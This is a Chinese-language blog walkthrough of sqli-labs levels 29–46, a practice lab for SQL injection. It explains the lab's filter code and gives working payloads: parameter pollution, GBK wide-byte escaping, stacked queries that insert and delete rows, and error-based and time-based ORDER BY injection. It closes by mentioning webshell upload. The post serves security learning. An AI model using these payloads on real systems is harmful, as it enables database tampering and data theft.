@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+    
+    <link rel='stylesheet' href="/./css/dracula.css">
+
+        <title>sqli-lab-less29-53</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="manifest" href="/site.webmanifest">
+
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Hexo</a>
+            </div>
+        </div>
+
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="al_sidebar">
+
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Hexo</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                <h4>John Doe</h4>
+                <img class="al_sidebar_avatar" src="https://yourAvatorURL">
+                <p></p>
+            </div>
+
+            
+        </div>
+    </div>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        sqli-lab-less29-53
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            Wed November 23, 2022 03:07 PM
+                        </div>
+
+                        
+
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+
+                
+                <section id="post-body">
+                    <p><strong>29关</strong><br>看看源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">	$match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">	if($match)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo &quot;you are good&quot;;</span><br><span class="line">		//return $match;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;	</span><br><span class="line">		header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">		//echo &quot;you are bad&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	foreach($qs_array as $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,0,2);</span><br><span class="line">		if($val==&quot;id&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,3,30); </span><br><span class="line">			return $id_value;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是<code>preg_match</code>：字符串的规则匹配。如果找到一个匹配，preg_match() 函数返回 1，否则返回 0。</p>
+<p><code>\d+ 表示可以出现1次或是n次数字</code></p>
+<p>然后后面有个<code>header(&#39;Location: hacked.php&#39;);</code>，可知这里是有两个网页的。</p>
+<p><code>explode</code>可以使一个字符串按照某一字符串作为边界点来分隔成数组<br>array explode(string $delimiter ,string $string [, int $limit ])<br>参数说明：<br>1.delimiter：边界上的分隔符，该参数不能是空字符串，必需<br>2.string：输入的字符串，必需<br>3.limit：可选<br>    如果设置了limit参数并且是正数，则返回的数组最多包含limit个元素，而最后那个元素将包含string的剩余部分。<br>    如果limit参数是负数，则返回除了最后的-limit个元素外的所有元素。<br>    如果limit是0，则会被当做1</p>
+<p>eg:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &#x27;1,2,3,4,5,6,7,8,9&#x27;;</span><br><span class="line">$arr = explode(&#x27;,&#x27;, $str, 5);</span><br><span class="line">echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">print_r($arr);</span><br><span class="line">echo &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">    [1] =&gt; 2</span><br><span class="line">    [2] =&gt; 3</span><br><span class="line">    [3] =&gt; 4</span><br><span class="line">    [4] =&gt; 5,6,7,8,9</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>而这里<code>$qs_array= explode(&quot;&amp;&quot;,$q_s);</code><br>我们就可以知道这里以&amp;为界限分割$q_s</p>
+<p><code>foreach</code><br> foreach 循环结构是遍历数组时常用的方法<br>foreach 有以下两种语法格式：<br>1、foreach (array_expression as $value)<br>2、foreach (array_expression as $key &#x3D;&gt; $value)<br>第一种格式遍历 array_expression 数组时，每次循环将数组的值赋给 $value；第二种遍历不仅将数组值赋给 $value，还将键名赋给 $key。</p>
+<p>这两个函数的意思是将语句从“&amp;”中分割开，然后在数组的前两位找id值，如果找到了就截取这个数组的第4位后面的30位交给preg_match()</p>
+<p>这就是waf，是很强的过滤</p>
+<p>这题是双服务器<br>详细内容可以看这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762961.html">https://www.cnblogs.com/lcamry/p/5762961.html</a></p>
+<p>结合源码我们发现，tomcat获取的是第一个数据，而处理我们想要数据的apache获取的是第二个数据。<br>我们可以构造两个数据，让tomcat只取得第一个合法数据，而第二个语句就让apache处理</p>
+<p>比如这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&#x27;union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+<hr>
+<p><strong>第32关</strong><br>源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它将 ‘ 转为 &#39; ， 将 \ 转为 \ ，将 “ 转为 &quot;</p>
+<p>还有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>
+<p>的意思是：进行gbk编码</p>
+<p>接下来简单介绍一下gbk编码：<br>GBK就是在保存你的帖子的时候，一个汉字占用两个字节。外国人看会出现乱码，此为我国为自己汉字编码而形成之解决方案。</p>
+<p>一开始是只有我们熟知的ASCII，它是鼻祖，最简单的方式，字节高位为0。但是它太有限了，无法表示世界上那么多的文字与符号。</p>
+<p>然后出现的Unicode改善了这一情况，它是统一编码，它建立了一个全世界统一的码表。世界上的所有文字，在这张码表中都是唯一的。各个国家之间都推出了各自的编码标准，gbk就是中国标准，只在中国使用，而Unicode把全球所有语言统一到了一个编码里。<br>详细可以查看这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37859539/article/details/79857476">https://blog.csdn.net/qq_37859539&#x2F;article&#x2F;details&#x2F;79857476</a></p>
+<p>那我们怎么利用这个来绕过单引号注入呢？<br>原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ‘ 的时候，往往利用的思路是将 ‘ 转换为 &#39;</p>
+<p>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：</p>
+<p>1、%df吃掉 \ 具体的原因是urlencode(&#39;) &#x3D; %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2、将 &#39; 中的 \ 过滤掉，例如可以构造 %aa%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是过滤的一种方法。</p>
+<p>eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%aa%27%20union%20select%201,database(),3--+</span><br></pre></td></tr></table></figure>
+<p>注意在查询后面时，会遇到’security’也有单引号<br>我们要把security进行16进制转化后，加上0x来代替。</p>
+<p><strong>33关</strong>同理，只是用addslashes()函数进行过滤操作<br><strong>36关</strong>同理，只是用mysql_real_escape_string()函数进行过滤</p>
+<hr>
+<p><strong>第34关</strong><br>也是过滤了前几关的东西，不过变成post形势</p>
+<p>我们前几关是get型，get型的方式我们是以url形式提交的，我们通过单引号url解码后变成%5c%27的形势，加上个%aa让%aa%5c形成整体来绕过。</p>
+<p>这关我们还是一样输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%aa&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
+<p>不过好像不行<br>我们用bp抓个包看看<br><img src="data:image/png;base64,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"></p>
+<p>我们可以看到，%aa变成了%25aa，<br>这是因为在POST上传数据时，原来%a0前的那个“%”被URL编码成%25，因此我们只需要将这个25删掉就行了。</p>
+<p>还有个简单的方法：<br>将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为 �’<br>eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
+<p>即可。<br><strong>37关</strong>同理<br>只是用mysql_real_escape_string()函数过滤</p>
+<hr>
+<p><strong>35关</strong><br>过滤了单引号<br>不过后来发现根本不需要单引号<br><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+<hr>
+<p><strong>38关</strong><br>先看看原代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br></pre></td></tr></table></figure>
+<p>定义和用法<br>mysqli_connect() 函数打开一个到 MySQL 服务器的新的连接。</p>
+<p>语法<br>mysqli_connect(host,username,password,dbname,port,socket);</p>
+<p>参数	描述</p>
+<ul>
+<li>host	    可选。规定主机名或 IP 地址。</li>
+<li>username	可选。规定 MySQL 用户名。</li>
+<li>password	可选。规定 MySQL 密码。</li>
+<li>dbname	可选。规定默认使用的数据库。</li>
+<li>port	    可选。规定尝试连接到 MySQL 服务器的端口号。</li>
+<li>socket    可选。规定 socket 或要使用的已命名 pipe。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@mysqli_select_db($con1, $dbname) </span><br></pre></td></tr></table></figure>
+<p>定义和用法<br>mysqli_select_db() 函数用于更改连接的默认数据库。</p>
+<p>语法<br>mysqli_select_db(connection,dbname);</p>
+<p>参数	描述</p>
+<ul>
+<li>connection	必需。规定要使用的 MySQL 连接。</li>
+<li>dbname	    必需，规定要使用的默认数据库。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    /* store first result set */</span><br><span class="line">    if ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        if($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;	</span><br><span class="line">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//            mysqli_free_result($result);</span><br><span class="line">    &#125;</span><br><span class="line">        /* print divider */</span><br><span class="line">    if (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            //printf(&quot;-----------------\n&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>定义和用法<br>mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</p>
+<p>语法<br>mysqli_multi_query(connection,query);</p>
+<p>参数	描述</p>
+<ul>
+<li>connection	必需。规定要使用的 MySQL 连接。</li>
+<li>query	        必需。规定一个或多个查询，用分号进行分隔。</li>
+</ul>
+<p><strong>mysql_store_result()函数</strong><br>用于将mysqli_query()查询的结果集存储到变量中</p>
+<p><strong>mysqli_more_results() 函数</strong><br>定义和用法<br>mysqli_more_results() 函数检查一个多查询是否有更多的结果。</p>
+<p>语法<br>mysqli_more_results(connection);</p>
+<p>参数	描述</p>
+<ul>
+<li>connection	必需。规定要使用的 MySQL 连接。</li>
+</ul>
+<p>这题直接联合注入就行<br>不过我们根据提示<br>加上源代码有这个<code>mysli_multi_query()</code></p>
+<p>我们可以用<strong>堆叠注入</strong><br>原理可以看这里<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762905.html">https://www.cnblogs.com/lcamry/p/5762905.html</a></p>
+<p>这篇有些应用<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/51f01046b987">https://www.jianshu.com/p/51f01046b987</a></p>
+<p>我们可以构造这样一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;insert into users(id,username,password)values(99,&#x27;123&#x27;,&#x27;456&#x27;) --+</span><br></pre></td></tr></table></figure>
+<p>虽然它只返回了id&#x3D;1的页面<br>但是其实我们已经修改成功了<br>我们再次输入id&#x3D;99，我们可以看到username已经变成123，password已经变成456了</p>
+<p>同理我们还能删除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;delete from users where id=99 --+</span><br></pre></td></tr></table></figure>
+<p>查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27%20union%20select%201,2,3;</span><br></pre></td></tr></table></figure>
+<p>把注释号用；就行</p>
+<p><strong>39关</strong>同理，无闭合<br><strong>40关</strong>同理，闭合为’)<br><strong>41关</strong>同理，和39一样，只是无回显</p>
+<hr>
+<p><strong>42关</strong><br>username被过滤<br>在password中考虑注入<br>同样用堆叠注入</p>
+<p><strong>42关</strong>是单引号字符型注入，<strong>43关</strong>是单引号括号注入，<strong>44关</strong>是单引号盲注，<strong>45关</strong>是单引号括号盲注</p>
+<hr>
+<p><strong>46关</strong><br>从本关开始，我们开始学习<strong>order by 相关注入</strong>的知识。</p>
+<p>我们发现在源代码中出现了一个和以前都不一样的东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br></pre></td></tr></table></figure>
+<p>从上述的sql语句中我们可以看出，我们的注入点在order by后面的参数中，而order by不同于的我们在where后的注入点，不能使用union等进行注入</p>
+<p><strong>判断存在注入：</strong><br>尝试?sort&#x3D;1 desc 或者 asc，显示结果不同，则表明可以注入。（降序 or 升序排列）<br>如果order by ‘1’显示的是默认排序</p>
+<p><strong>注入语句：</strong><br>除了没有联合注入，其他大体相同<br>报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure>
+<p>时间：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and if(length(database())=8,sleep(5),1)</span><br></pre></td></tr></table></figure>
+<p>同理，我们还能写入一句话木马</p>
